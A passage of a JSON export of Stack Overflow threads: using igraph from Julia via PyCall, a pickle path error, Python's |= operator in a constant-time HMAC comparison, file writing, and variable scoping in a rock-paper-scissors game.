{"owner": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1427994102, "post_id": 29399865, "comment_id": 47008849, "body": "It doesn&#39;t even work using Numpy as you had done before? If that&#39;s the case, you might want to file a bug report with the developers on GitHub."}, {"owner": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 1, "creation_date": 1428433556, "post_id": 29399865, "comment_id": 47157161, "body": "If it worked a couple of months ago and it no longer does, it probably has something to do with the fact that you&#39;re using the dev version of Julia. Does it work if you try it with the most recent stable release? (0.3.7, I think)"}, {"owner": {"reputation": 774, "user_id": 3935797, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/fb6313a96210b4d4897206279b7ebd7f?s=128&d=identicon&r=PG&f=1", "display_name": "RM-", "link": "https://stackoverflow.com/users/3935797/rm"}, "reply_to_user": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1428456769, "post_id": 29399865, "comment_id": 47166164, "body": "Yes, that just solved it."}, {"owner": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1428456956, "post_id": 29399865, "comment_id": 47166206, "body": "Glad to hear it! Were you able to load igraph as well? If this completely solved the issue, I&#39;ll post it as an answer/edit my current answer."}, {"owner": {"reputation": 774, "user_id": 3935797, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/fb6313a96210b4d4897206279b7ebd7f?s=128&d=identicon&r=PG&f=1", "display_name": "RM-", "link": "https://stackoverflow.com/users/3935797/rm"}, "reply_to_user": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "edited": false, "score": 0, "creation_date": 1429577166, "post_id": 29399865, "comment_id": 47653942, "body": "Yes it does. Please do."}], "answers": [{"comments": [{"owner": {"reputation": 27400, "user_id": 659248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21aeae1f260365557523718bc19640f7?s=128&d=identicon&r=PG", "display_name": "StefanKarpinski", "link": "https://stackoverflow.com/users/659248/stefankarpinski"}, "edited": false, "score": 5, "creation_date": 1427923372, "post_id": 29400911, "comment_id": 46977861, "body": "The igraph library looks like it has a pretty clean C API so it would be easy enough to wrap from Julia."}], "tags": [], "owner": {"reputation": 5106, "user_id": 3005513, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XKxoq.png?s=128&g=1", "display_name": "Alex A.", "link": "https://stackoverflow.com/users/3005513/alex-a"}, "is_accepted": true, "score": 2, "last_activity_date": 1428945684, "last_edit_date": 1428945684, "creation_date": 1427922628, "answer_id": 29400911, "question_id": 29399865, "link": "https://stackoverflow.com/questions/29399865/using-igraph-library-in-julia-with-pycall/29400911#29400911", "title": "Using Igraph library in Julia with PyCall", "body": "<p>From the main page of the igraph website:</p>\n\n<blockquote>\n  <p>igraph can be programmed in R, Python, and C/C++.</p>\n</blockquote>\n\n<p>So right now there's no official native Julia package for igraph. In general, Julia can't read a package native to another language, so you'll either have to write your own interface for it or find a comparable existing Julia package.</p>\n\n<p>You can browse available Julia packages on <a href=\"http://pkg.julialang.org\" rel=\"nofollow\">http://pkg.julialang.org</a>.</p>\n\n<hr>\n\n<p>Since you edited your question to be specific to PyCall, I'll address that as well.</p>\n\n<p>Note that you're using a development version of Julia. Try using the latest stable release (0.3.7, I believe) and running your code using PyCall again.</p>\n"}], "owner": {"reputation": 774, "user_id": 3935797, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/fb6313a96210b4d4897206279b7ebd7f?s=128&d=identicon&r=PG&f=1", "display_name": "RM-", "link": "https://stackoverflow.com/users/3935797/rm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 574, "favorite_count": 0, "accepted_answer_id": 29400911, "answer_count": 1, "score": 0, "last_activity_date": 1428945684, "creation_date": 1427919022, "last_edit_date": 1427926297, "question_id": 29399865, "link": "https://stackoverflow.com/questions/29399865/using-igraph-library-in-julia-with-pycall", "title": "Using Igraph library in Julia with PyCall", "body": "<p>I would like to use certain features of the Python library Igraph in Julia-lang. I am aware that there exists a Julia package Graphs but I specifically need Igraph.\nI have previously used python libraries with PyCall, but this time when I do.</p>\n\n<pre><code>using PyCall\n@pyimport igraph\n</code></pre>\n\n<p>But I get error:</p>\n\n<pre><code>@pyimport not defined\n</code></pre>\n\n<p>My current Julia version is: 0.4.0-dev+147</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["python", "io", "pickle", "canonical-quickly"], "comments": [{"owner": {"reputation": 27099, "user_id": 2379433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/197d2417f199b0b6f951ee62e627a1d8?s=128&d=identicon&r=PG", "display_name": "Mike McKerns", "link": "https://stackoverflow.com/users/2379433/mike-mckerns"}, "edited": false, "score": 0, "creation_date": 1429139996, "post_id": 29399659, "comment_id": 47464714, "body": "a better return value for the error case of <code>get_saved_snaps</code> would be something iterable if you are expecting to load something iterable and all you want to do in the error case is to print a warning."}], "answers": [{"tags": [], "owner": {"reputation": 97, "user_id": 1397183, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/036b1f8e878edd12df0e092a54ec59bc?s=128&d=identicon&r=PG", "display_name": "AdamR", "link": "https://stackoverflow.com/users/1397183/adamr"}, "is_accepted": true, "score": 0, "last_activity_date": 1427934124, "creation_date": 1427934124, "answer_id": 29403095, "question_id": 29399659, "link": "https://stackoverflow.com/questions/29399659/quickly-runtime-and-p-files/29403095#29403095", "title": "Quickly runtime and .p files", "body": "<p>After a little researching it turns out that the dynamic or relative file paths have trouble being executed while quickly is also being executed. So by switching </p>\n\n<pre><code>  def get_saved_snaps():\ntry:\n    with open('data/newSnapShots.p','rb') as snapFile:\n</code></pre>\n\n<p>for </p>\n\n<pre><code>def get_saved_snaps():\ntry:\n    with open('/absolute_path/quickly_project/data/newSnapShots.p','rb') as snapFile:\n</code></pre>\n\n<p>The issue was resolved. I don\u2019t know why relative paths behave this way.</p>\n"}], "owner": {"reputation": 97, "user_id": 1397183, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/036b1f8e878edd12df0e092a54ec59bc?s=128&d=identicon&r=PG", "display_name": "AdamR", "link": "https://stackoverflow.com/users/1397183/adamr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 492, "favorite_count": 0, "accepted_answer_id": 29403095, "answer_count": 1, "score": 0, "last_activity_date": 1427934124, "creation_date": 1427918220, "question_id": 29399659, "link": "https://stackoverflow.com/questions/29399659/quickly-runtime-and-p-files", "title": "Quickly runtime and .p files", "body": "<p>I am trying to build a application in python using quickly mostly everything is working however when i try to run a function that reads a .p (pickle) file i am getting a I/O error. The strange thing is when i run the same python program in the shell it works fine. </p>\n\n<pre><code> adam@adam-System-Product-Name:~/reskin/reskin$ quickly run    \n      2, No such file or directory,  newSnapShots.p \n    Traceback (most recent call last):\n      File \"bin/reskin\", line 36, in &lt;module&gt; \n        reskin.main()\n      File \"/home/adam/reskin/reskin/__init__.py\", line 31, in main\n        window = ReskinWindow.ReskinWindow()\n      File \"/home/adam/reskin/reskin_lib/Window.py\", line 37, in __new__\n        new_object.finish_initializing(builder)\n      File \"/home/adam/reskin/reskin/ReskinWindow.py\", line 36, in finish_initializing\n        self.set_app_data(builder) \n      File \"/home/adam/reskin/reskin/ReskinWindow.py\", line 43, in set_app_data\n        viewControler.app_by_name(\"firstVar\")\n      File \"/home/adam/reskin/reskin/back/viewControler.py\", line 29, in app_by_name\n        app = applicationGetter.get_app_by_name(name)\n      File \"/home/adam/reskin/reskin/back/applicationGetter.py\", line 8, in get_app_by_name\n        for snap in savedSnaps:\n    TypeError: 'bool' object is not iterable\n</code></pre>\n\n<p>Function that prints error:</p>\n\n<pre><code>def get_saved_snaps():\ntry:\n    with open('data/newSnapShots.p','rb') as snapFile:\n        savedSnaps = pickle.load(snapFile)\n\nexcept IOError as e:\n    print \"{0}, {1},  newSnapShots.p \".format(e.errno, e.strerror)\n    return False\n\nreturn savedSnaps\n</code></pre>\n\n<p>tree of files and .p location</p>\n\n<pre><code>.\n\u251c\u2500\u2500 applicationGetter.py\n\u251c\u2500\u2500 applicationGetter.pyc\n\u251c\u2500\u2500 data\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 newSnapShots.p    &lt; file here\n\u251c\u2500\u2500 firstTimeSnapList.py\n\u251c\u2500\u2500 __init__.py\n\u251c\u2500\u2500 __init__.pyc\n\u251c\u2500\u2500 prosessCheckerv3.py\n\u251c\u2500\u2500 prosessScript.sh\n\u251c\u2500\u2500 viewControler.py\n\u2514\u2500\u2500 viewControler.pyc\n</code></pre>\n\n<p>Is there some issue using Cpickle with quickly should i be using something else instead ? \nThank you in advance. </p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 36902, "user_id": 223424, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/e97c628a88337b15e76a4690e916a2cd?s=128&d=identicon&r=PG", "display_name": "9000", "link": "https://stackoverflow.com/users/223424/9000"}, "edited": false, "score": 0, "creation_date": 1427918451, "post_id": 29399653, "comment_id": 46975290, "body": "<code>result |= a ^ b</code> boils down to <code>result = result | (a ^ b)</code>. The value of <code>result</code> will be nonzero if exactly one of <code>a</code> and <code>b</code> is <code>1</code>."}, {"owner": {"reputation": 36902, "user_id": 223424, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/e97c628a88337b15e76a4690e916a2cd?s=128&d=identicon&r=PG", "display_name": "9000", "link": "https://stackoverflow.com/users/223424/9000"}, "edited": false, "score": 0, "creation_date": 1427918552, "post_id": 29399653, "comment_id": 46975350, "body": "BTW why don&#39;t you just compare objects as in <code>x == y</code>? If you must scan the objects, why don&#39;t you use easier to understand logic like <code>if a != b: return False</code>?"}, {"owner": {"reputation": 73, "user_id": 4715735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce15ce923bb526c2644fdf1a4ce2db51?s=128&d=identicon&r=PG&f=1", "display_name": "muffin2015", "link": "https://stackoverflow.com/users/4715735/muffin2015"}, "reply_to_user": {"reputation": 36902, "user_id": 223424, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/e97c628a88337b15e76a4690e916a2cd?s=128&d=identicon&r=PG", "display_name": "9000", "link": "https://stackoverflow.com/users/223424/9000"}, "edited": false, "score": 0, "creation_date": 1427919053, "post_id": 29399653, "comment_id": 46975635, "body": "As far as I have understood this, the problem relies in a timing attack in which an attacker gets an advantage. But I did not read into the full details."}, {"owner": {"reputation": 36902, "user_id": 223424, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/e97c628a88337b15e76a4690e916a2cd?s=128&d=identicon&r=PG", "display_name": "9000", "link": "https://stackoverflow.com/users/223424/9000"}, "edited": false, "score": 0, "creation_date": 1427922576, "post_id": 29399653, "comment_id": 46977498, "body": "If a timing attack is an issue (it might be), I think the rest of conditiona operators must be eliminated. Something like <code>reduce(lambda acc, (m, n): acc and (m == n), zip(a, b), True)</code> will always execute in <i>O(len(a))</i> time and return <code>True</code> iff <code>a == b</code> element-wise. You could consider padding both <code>x</code> and <code>y</code> to the same length to avoid timing attack that finds out the length, but SHA512 digests are expected to be the same length anyway."}], "answers": [{"tags": [], "owner": {"reputation": 19646, "user_id": 494074, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/741e480d426fabd85825861bd6481ccd?s=128&d=identicon&r=PG", "display_name": "Ankur Agarwal", "link": "https://stackoverflow.com/users/494074/ankur-agarwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1427918295, "creation_date": 1427918295, "answer_id": 29399680, "question_id": 29399653, "link": "https://stackoverflow.com/questions/29399653/python-operator-meaning/29399680#29399680", "title": "Python Operator |= meaning", "body": "<p>Bit wise <strong>or and assignment</strong> in one step. Kind of like</p>\n\n<pre><code>a+=1 # which means a = a + 1\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 73, "user_id": 4715735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce15ce923bb526c2644fdf1a4ce2db51?s=128&d=identicon&r=PG&f=1", "display_name": "muffin2015", "link": "https://stackoverflow.com/users/4715735/muffin2015"}, "edited": false, "score": 0, "creation_date": 1427918742, "post_id": 29399688, "comment_id": 46975453, "body": "Ok, that seems kind of obvious [feeling stupid]. But I still don&#39;t understand why this would break."}, {"owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "reply_to_user": {"reputation": 73, "user_id": 4715735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce15ce923bb526c2644fdf1a4ce2db51?s=128&d=identicon&r=PG&f=1", "display_name": "muffin2015", "link": "https://stackoverflow.com/users/4715735/muffin2015"}, "edited": false, "score": 1, "creation_date": 1427918873, "post_id": 29399688, "comment_id": 46975529, "body": "Open a new question for that imho; it&#39;s considered good practice to limit SO posts to a single question with an answer, to the extent that&#39;s possible. And when you do, give the error message/stack trace ;)"}], "tags": [], "owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "is_accepted": true, "score": 22, "last_activity_date": 1427918342, "creation_date": 1427918342, "answer_id": 29399688, "question_id": 29399653, "link": "https://stackoverflow.com/questions/29399653/python-operator-meaning/29399688#29399688", "title": "Python Operator |= meaning", "body": "<p><code>|</code> is the bitwise OR operator. <code>|=</code> is the bitwise OR equivalent of <code>+=</code>, <code>-=</code>, etc. Basically, <code>a |= b</code> is shorthand for <code>a = a | b</code>. </p>\n"}], "owner": {"reputation": 73, "user_id": 4715735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce15ce923bb526c2644fdf1a4ce2db51?s=128&d=identicon&r=PG&f=1", "display_name": "muffin2015", "link": "https://stackoverflow.com/users/4715735/muffin2015"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 20723, "favorite_count": 4, "accepted_answer_id": 29399688, "answer_count": 2, "score": 6, "last_activity_date": 1427918358, "creation_date": 1427918196, "question_id": 29399653, "link": "https://stackoverflow.com/questions/29399653/python-operator-meaning", "title": "Python Operator |= meaning", "body": "<p>due to some versioning problems with python I am bound to use a custom function to compare HMACs (SHA512). To do so I have found this function:</p>\n\n<pre><code>def compare_digest(x, y):\n    if not (isinstance(x, bytes) and isinstance(y, bytes)):\n        logfile.debug(\"both inputs should be instances of bytes\")\n    if len(x) != len(y):\n        return False\n    result = 0\n    for a, b in zip(x, y):\n        result |= a ^ b\n    return result == 0\n</code></pre>\n\n<p>I am using this in Django, hence I created a logger (logfile) that saves debug messages into a file for me.</p>\n\n<p>The code breaks at this step:</p>\n\n<pre><code>result |= a ^ b\n</code></pre>\n\n<p>However, I have no idea what the |= operator stands for and what happens here. If someone could explain this I could try to rewrite this. </p>\n\n<p>My python version is (unfortunately 2.7.4) with 2.7.7 I would not have the problem, as the function would have been ported correctly and made available.</p>\n"}, {"tags": ["python", "file", "input"], "comments": [{"owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "edited": false, "score": 2, "creation_date": 1427918190, "post_id": 29399638, "comment_id": 46975163, "body": "<code>close</code> is a function and needs <code>()</code> at the end as in <code>close()</code>"}, {"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 1, "creation_date": 1427918217, "post_id": 29399638, "comment_id": 46975177, "body": "Why are you writing to a Python file."}, {"owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427918248, "post_id": 29399638, "comment_id": 46975196, "body": "The .py shouldn&#39;t matter - you can open .txt or .dat or .exe just as easily, so something else is going on."}, {"owner": {"reputation": 11, "user_id": 4739774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/298268adabcfa69b08ecb0bbf281e043?s=128&d=identicon&r=PG&f=1", "display_name": "Zach Timms", "link": "https://stackoverflow.com/users/4739774/zach-timms"}, "edited": false, "score": 0, "creation_date": 1427918261, "post_id": 29399638, "comment_id": 46975207, "body": "Wow - Thank you. Easy thing to overlook"}, {"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427918493, "post_id": 29399638, "comment_id": 46975315, "body": "Are you writing strings or actual Python objects like dictionaries or lists? You might want to use pickle in that case. I think you&#39;re getting confused."}], "answers": [{"tags": [], "owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "is_accepted": false, "score": 4, "last_activity_date": 1427920070, "last_edit_date": 1427920070, "creation_date": 1427918345, "answer_id": 29399690, "question_id": 29399638, "link": "https://stackoverflow.com/questions/29399638/how-to-write-and-save-to-a-document-in-python-3-4/29399690#29399690", "title": "How to write and save to a document in Python 3.4?", "body": "<p>Close method should be called (<code>f.close()</code>). To avoid these kind of mistakes and ensure releasing resources on errors/exceptions you may consider using Python <a href=\"https://www.python.org/dev/peps/pep-0343/\" rel=\"nofollow\">with statement</a>, e.g.</p>\n\n<pre><code>with open(\"file.txt\",\"w\") as f:\n    f.write(\"data\") \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7892, "user_id": 3310334, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/BTb0z.jpg?s=128&g=1", "display_name": "theonlygusti", "link": "https://stackoverflow.com/users/3310334/theonlygusti"}, "is_accepted": false, "score": 0, "last_activity_date": 1427919153, "creation_date": 1427919153, "answer_id": 29399894, "question_id": 29399638, "link": "https://stackoverflow.com/questions/29399638/how-to-write-and-save-to-a-document-in-python-3-4/29399894#29399894", "title": "How to write and save to a document in Python 3.4?", "body": "<p><a href=\"http://www.tutorialspoint.com/python/file_close.htm\" rel=\"nofollow\"><code>close</code></a> is a method and should be called as such; <code>f.close()</code> is the correct syntax, currently you are omitting the brackets <code>()</code>.</p>\n\n<pre><code>test = open(\"sketch_pad.py\",\"w\")\ntest.write(\"This is a test\\nOr is it?\")\ntest.close() # you need these brackets\n</code></pre>\n\n<p>should work.</p>\n\n<p>You can dodge these kinds of mistakes by using <a href=\"http://effbot.org/zone/python-with-statement.htm\" rel=\"nofollow\">Python's with statement</a>:</p>\n\n<pre class=\"lang-python prettyprint-override\"><code>with open(\"myFile.txt\", \"w\") as myFile:\n    myFile.write(\"data\")\n\n# no need for myFile.close(),\n# it is called automatically.\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4739774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/298268adabcfa69b08ecb0bbf281e043?s=128&d=identicon&r=PG&f=1", "display_name": "Zach Timms", "link": "https://stackoverflow.com/users/4739774/zach-timms"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 602, "favorite_count": 0, "closed_date": 1427920249, "answer_count": 2, "score": 0, "last_activity_date": 1427920070, "creation_date": 1427918140, "question_id": 29399638, "link": "https://stackoverflow.com/questions/29399638/how-to-write-and-save-to-a-document-in-python-3-4", "closed_reason": "Not suitable for this site", "title": "How to write and save to a document in Python 3.4?", "body": "<p>I've been trying to make a simple program to save user data (such as a level or stat) and so far nothing I've found online works.</p>\n\n<pre><code>test = open(\"sketch_pad.py\",\"w\")\ntest.write(\"This is a test\\nOr is it?\")\ntest.close\n</code></pre>\n\n<p>This brings up an error, along the lines of \"Not writable file\" (despite the fact that it is a .py)\nEither this, or it will erase all the data in the document \"sketch_pad.py\", and not write anything.</p>\n"}, {"tags": ["python", "variables", "python-3.x"], "comments": [{"owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "edited": false, "score": 2, "creation_date": 1427917838, "post_id": 29399497, "comment_id": 46974954, "body": "List in Python are mutable. Integers are not, You cannot update integer value when it&#39;s passed as argument."}], "answers": [{"comments": [{"owner": {"reputation": 10108, "user_id": 320021, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c4de32fdfcc729ae62e607c352685afb?s=128&d=identicon&r=PG", "display_name": "Sergey", "link": "https://stackoverflow.com/users/320021/sergey"}, "edited": false, "score": 0, "creation_date": 1427918795, "post_id": 29399649, "comment_id": 46975484, "body": "I don&#39;t think this relates to mutability of lists - <i>assigning</i> to a_list in your example won&#39;t be reflected outside of the function either."}], "tags": [], "owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "is_accepted": false, "score": 0, "last_activity_date": 1427918182, "creation_date": 1427918182, "answer_id": 29399649, "question_id": 29399497, "link": "https://stackoverflow.com/questions/29399497/rockpaperscissors-total-amounts-not-receiving-the-updated-values-python/29399649#29399649", "title": "Rock^Paper^Scissors Total Amounts not receiving the updated values...Python", "body": "<p>List in Python are mutable. Integers are not. Therefore you cannot update integer value by passing it as function argument. </p>\n\n<p>Minimal reproducible code:</p>\n\n<pre><code>def f(a_list, an_integer):\n     a_list.append(3)\n     an_integer += 1\n     print a_list, an_integer\n\n\nl = []\ni = 1\nf(l, i)  # output: [3] 2\nf(l, i)  # [3, 3] 2\nf(l, i)  # [3, 3, 3] 2\nprint l, i  # [3, 3, 3] 1\n</code></pre>\n\n<p>Solution would be to return these values from function and update these integers explicitly.</p>\n\n<pre><code>totalTies, userWins, cpuWins = replay(...)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 10108, "user_id": 320021, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c4de32fdfcc729ae62e607c352685afb?s=128&d=identicon&r=PG", "display_name": "Sergey", "link": "https://stackoverflow.com/users/320021/sergey"}, "is_accepted": false, "score": 0, "last_activity_date": 1427918587, "creation_date": 1427918587, "answer_id": 29399749, "question_id": 29399497, "link": "https://stackoverflow.com/questions/29399497/rockpaperscissors-total-amounts-not-receiving-the-updated-values-python/29399749#29399749", "title": "Rock^Paper^Scissors Total Amounts not receiving the updated values...Python", "body": "<p>Passing a value to a function in Python creates a copy of the value, it is not possible to update the original function argument by modifying the value within the function:</p>\n\n<pre><code>def a(mynumber):\n    mynumber = 10\n\nmynumber = 5 \na(mynumber) \nprint(mynumber)  # will print 5\n</code></pre>\n\n<p>This works the same even for lists and complex objects - while you can modify call the methods of the object, which may modify its state, you can not replace the actual reference in the caller's code.</p>\n\n<p>One possible solution in your case would be to use globals and do not pass \"shared\" variables as parameters:</p>\n\n<pre><code>userItems = 0\nmachineItems = 0 \ntotalTies = 0 \nuserWins = 0 \ncpuWins = 0\n\ndef replay(items):\n    global userItems, machineItems, totalTies, userWins, cpuWins\n    ...\n\ndef printResults():\n    global userItems, machineItems, totalTies, userWins, cpuWins\n    ...\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 45, "user_id": 4508342, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/86cfc50d2cdfdec115c26f9e4eec4745?s=128&d=identicon&r=PG&f=1", "display_name": "Ghost_Programmer", "link": "https://stackoverflow.com/users/4508342/ghost-programmer"}, "edited": false, "score": 0, "creation_date": 1427918770, "post_id": 29399761, "comment_id": 46975468, "body": "Thank you all for your help once again, and I do not doubt that these will work! Have a great rest of your day! Python Novice, Ghost_Programmer!"}], "tags": [], "owner": {"reputation": 45, "user_id": 4508342, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/86cfc50d2cdfdec115c26f9e4eec4745?s=128&d=identicon&r=PG&f=1", "display_name": "Ghost_Programmer", "link": "https://stackoverflow.com/users/4508342/ghost-programmer"}, "is_accepted": false, "score": 0, "last_activity_date": 1427918620, "creation_date": 1427918620, "answer_id": 29399761, "question_id": 29399497, "link": "https://stackoverflow.com/questions/29399497/rockpaperscissors-total-amounts-not-receiving-the-updated-values-python/29399761#29399761", "title": "Rock^Paper^Scissors Total Amounts not receiving the updated values...Python", "body": "<p>Thank you for all of your help, but I have figured it out.</p>\n\n<p>This is what <code>main()</code> and <code>printResults()</code> should look like:</p>\n\n<pre><code>def main():\n    ### Declarations ###\n    items = []\n    userItems = []\n    machineItems = []\n    totalTies = []\n    userWins = []\n    cpuWins = []\n\n    ### Adding elements ###\n    items.append(\"rock\")\n    items.append(\"paper\")\n    items.append(\"scissors\")\n\n    ### Function calls ###\n    replay(items, userItems, machineItems, totalTies, userWins, cpuWins)\n    os.system('cls')\n    printResults(userItems, machineItems, totalTies, userWins, cpuWins)\n\ndef printResults(userItems, machineItems, totalTies, userWins, cpuWins):\n    print(\"You chose: \", \"\\n\")\n    for i in userItems:\n        print(\"\\t\", i)\n\n    print(\"The computer chose: \", \"\\n\")\n    for i in machineItems:\n        print(\"\\t\", i)\n\n    print(\"Total ties: \", sum(totalTies))\n    print(\"User wins: \", sum(userWins))\n    print(\"Computer wins: \", sum(cpuWins))\n\n    gamesPlayed = (sum(totalTies) + sum(userWins) + sum(cpuWins))\n    print(\"Games played: \", gamesPlayed)\n\n    input(\"Press [Enter] to continue...\")\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 768, "user_id": 4739732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sg7P9.jpg?s=128&g=1", "display_name": "agamagarwal", "link": "https://stackoverflow.com/users/4739732/agamagarwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1427918783, "creation_date": 1427918783, "answer_id": 29399809, "question_id": 29399497, "link": "https://stackoverflow.com/questions/29399497/rockpaperscissors-total-amounts-not-receiving-the-updated-values-python/29399809#29399809", "title": "Rock^Paper^Scissors Total Amounts not receiving the updated values...Python", "body": "<p>The issue here is that integers are immutable in python. When you are incrementing the values of the variables <code>userWins</code>, <code>cpuWins</code> and <code>totalTies</code>, the value of the variable is updated inside the <code>replay</code> function. Lists, on the other hand, are mutable. Thus, if you modify a list (add or remove elements) inside a function, the changes are reflected outside the function.</p>\n\n<p>There are two things you can do:</p>\n\n<ol>\n<li>Set the three integer variables to be globals. This method works, but is not recommended</li>\n<li><p>Make the function return the changed the integer values.</p>\n\n<p>Add the following line in the end of the <code>replay</code> function</p>\n\n<pre><code>return (totalTies, userWins, cpuWins)\n</code></pre>\n\n<p>Also, modify the line where you are calling the <code>replay</code> function to the following:</p>\n\n<pre><code>(totalTies, userWins, cpuWins)=replay((items, userItems, machineItems, totalTies, userWins, cpuWins)\n</code></pre>\n\n<p>This code should now work.</p></li>\n</ol>\n"}], "owner": {"reputation": 45, "user_id": 4508342, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/86cfc50d2cdfdec115c26f9e4eec4745?s=128&d=identicon&r=PG&f=1", "display_name": "Ghost_Programmer", "link": "https://stackoverflow.com/users/4508342/ghost-programmer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 61, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1427918783, "creation_date": 1427917638, "last_edit_date": 1427917739, "question_id": 29399497, "link": "https://stackoverflow.com/questions/29399497/rockpaperscissors-total-amounts-not-receiving-the-updated-values-python", "title": "Rock^Paper^Scissors Total Amounts not receiving the updated values...Python", "body": "<p>So here is my code:</p>\n\n<pre><code>import os\nimport 